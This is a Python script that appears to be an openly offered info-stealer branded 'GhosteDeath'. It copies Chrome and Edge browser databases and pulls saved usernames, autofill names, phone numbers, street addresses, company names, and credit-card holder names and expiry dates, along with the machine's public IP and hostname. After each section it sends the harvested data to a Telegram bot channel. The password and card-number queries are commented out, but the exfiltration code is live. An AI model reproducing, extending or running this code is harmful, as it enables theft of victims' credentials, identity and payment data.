import socket, os, sqlite3, win32crypt, requests, shutil

URL         = 'https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s&parse_mode=html'
TOKEN       = 'your-api'
CHANNELID   = '@GhosteDeath'
#put your channel id 
#
#Made By GhosteDeath
#
#█████▀████████████████████████████████████████████████████████
#█─▄▄▄▄█─█─█─▄▄─█─▄▄▄▄█─▄─▄─█▄─▄▄─█▄─▄▄▀█▄─▄▄─██▀▄─██─▄─▄─█─█─█
#█─██▄─█─▄─█─██─█▄▄▄▄─███─████─▄█▀██─██─██─▄█▀██─▀─████─███─▄─█
#▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄▄▄▀▀▄▄▄▄▄▀▄▄▀▄▄▀▀▄▄▄▀▀▄▀▄▀
#
#
#
#▀▀█▀▀ █▀▀█ █▀▀▄ █▀▀█ 
#──█── █──█ █──█ █──█ 
#──▀── ▀▀▀▀ ▀▀▀─ ▀▀▀▀
#
#Decrypt Passwords
#
######
#C Dump
chromePath = os.environ['LOCALAPPDATA'] + '\\Google\\Chrome\\User Data\\Default\\Login Data'
result = '=== Extracted from %s Computer ===\n' % os.environ['USERNAME']
if os.path.exists(chromePath):
    try:
        shutil.copy(chromePath, './data')
        connection = sqlite3.connect('./data')
        cursor = connection.cursor()
        h_name = socket.gethostname()
        IP_addres = socket.gethostbyname(h_name)
        public_ip = requests.get("https://api.ipify.org").text
        result += 'PubIP: %s\n' % public_ip
        result += 'IP: %s\n' % IP_addres
        result += 'Hostname: %s\n' % h_name
        result += 'AppData: %s\n' % os.environ['LOCALAPPDATA']
        #query  = cursor.execute('SELECT action_url FROM logins')
        #value  = query.fetchall()
        #result += 'Links: %s\n' % value
        query  = cursor.execute('SELECT username_value FROM logins')
        value  = query.fetchall()
        result += 'Usernames: %s\n' % value
        #query  = cursor.execute('SELECT password_value FROM logins')
        #value  = query.fetchall()
        #result += 'Passwords Encrypted: %s\n' % value
        ##CC  dump
        
    except Exception as e: result = '[-] Error: ' + str(e)
else: result = '[!] Computer dump failed!'

open(os.environ['USERNAME'] + '.txt', mode = 'w').write(result.strip())
requests.get(URL % (TOKEN, CHANNELID, '<pre>%s</pre>' % result))

#Dox Dump
webPath = os.environ['LOCALAPPDATA'] + '\\Google\\Chrome\\User Data\\Default\\Web Data'
result = '=== Extracted from %s Chrome ===\n' % os.environ['USERNAME']
if os.path.exists(webPath):
    try:
        shutil.copy(webPath, './web')
        connection = sqlite3.connect('./web')
        cursor = connection.cursor()
        query  = cursor.execute('SELECT country_code FROM autofill_profile_addresses')
        value  = query.fetchall()
        result += 'Country: %s\n' % value
        query  = cursor.execute('SELECT name_on_card FROM credit_cards')
        value  = query.fetchall()
        result += 'Full Name: %s\n' % value
        query  = cursor.execute('SELECT number FROM autofill_profile_phones')
        value  = query.fetchall()
        result += 'Phone: %s\n' % value
        query  = cursor.execute('SELECT street_address, street_name, house_number, city, zip_code FROM autofill_profile_addresses')
        value  = query.fetchall()
        result += 'Address: %s\n' % value
        #query  = cursor.execute('SELECT card_number_encrypted FROM credit_cards')
        #value  = query.fetchall()
        #result += 'Card Encrypted: %s\n' % value
        query  = cursor.execute('SELECT expiration_month, expiration_year FROM credit_cards')
        value  = query.fetchall()
        result += 'MH/YR: %s\n' % value

    except Exception as e: result = '[-] Error: ' + str(e)
else: result = '[!] Google Chrome is not installed!'

open(os.environ['USERNAME'] + '.txt', mode = 'w').write(result.strip())
requests.get(URL % (TOKEN, CHANNELID, '<pre>%s</pre>' % result))

#Edge Dump
edgePath = os.environ['LOCALAPPDATA'] + '\\Microsoft\\Edge\\User Data\\Default\\Login Data'
result = '=== Extracted from %s Edge ===\n' % os.environ['USERNAME']
if os.path.exists(edgePath):
    try:
        shutil.copy(edgePath, './edge')
        connection = sqlite3.connect('./edge')
        cursor = connection.cursor()
        #query  = cursor.execute('SELECT action_url FROM logins')
        #value  = query.fetchall()
        #result += 'Links: %s\n' % value
        query  = cursor.execute('SELECT username_value FROM logins')
        value  = query.fetchall()
        result += 'Usernames: %s\n' % value
        #query  = cursor.execute('SELECT password_value FROM logins')
        #value  = query.fetchall()
        #result += 'Passwords Encrypted: %s\n' % value
    except Exception as e: result = '[-] Error: ' + str(e)
else: result = '[!] Edge is not installed!'

open(os.environ['USERNAME'] + '.txt', mode = 'w').write(result.strip())
requests.get(URL % (TOKEN, CHANNELID, '<pre>%s</pre>' % result))
#Edge CC Dump
edgePath = os.environ['LOCALAPPDATA'] + '\\Microsoft\\Edge\\User Data\\Default\\Web Data'
result = '=== Extracted from %s Edge ===\n' % os.environ['USERNAME']
if os.path.exists(edgePath):
    try:
        shutil.copy(edgePath, './edge')
        connection = sqlite3.connect('./edge')
        cursor = connection.cursor()
        query  = cursor.execute('SELECT country_code FROM autofill_profile_addresses')
        value  = query.fetchall()
        result += 'Country: %s\n' % value
        query  = cursor.execute('SELECT full_name FROM autofill_profile_names')
        value  = query.fetchall()
        result += 'Full Name: %s\n' % value
        query  = cursor.execute('SELECT number FROM autofill_profile_phones')
        value  = query.fetchall()
        result += 'Phone: %s\n' % value
        query  = cursor.execute('SELECT company_name FROM autofill_profiles')
        value  = query.fetchall()
        result += 'Company Name: %s\n' % value
        query  = cursor.execute('SELECT street_address, street_name, house_number, city, zip_code FROM autofill_profile_addresses')
        value  = query.fetchall()
        result += 'Address: %s\n' % value
        #query  = cursor.execute('SELECT card_number_encrypted FROM credit_cards')
        #value  = query.fetchall()
        #result += 'Card Encrypted: %s\n' % value
        query  = cursor.execute('SELECT expiration_month, expiration_year FROM credit_cards')
        value  = query.fetchall()
        result += 'MH/YR: %s\n' % value
    except Exception as e: result = '[-] Error: ' + str(e)
else: result = '[!] Edge is not installed!'

open(os.environ['USERNAME'] + '.txt', mode = 'w').write(result.strip())
requests.get(URL % (TOKEN, CHANNELID, '<pre>%s</pre>' % result))
#Edge
#loginPath = os.environ['LOCALAPPDATA'] + '\AppData\Local\Microsoft\Edge\User Data\\Default\\Login Data'
#loginPath = os.environ['LOCALAPPDATA'] + '\AppData\Local\BraveSoftware\Brave-Browser\User Data\Login Data'
#loginPath = os.environ['LOCALAPPDATA'] + '\\AppData\Roaming\Mozilla\Firefox\Profiles\Login Data'
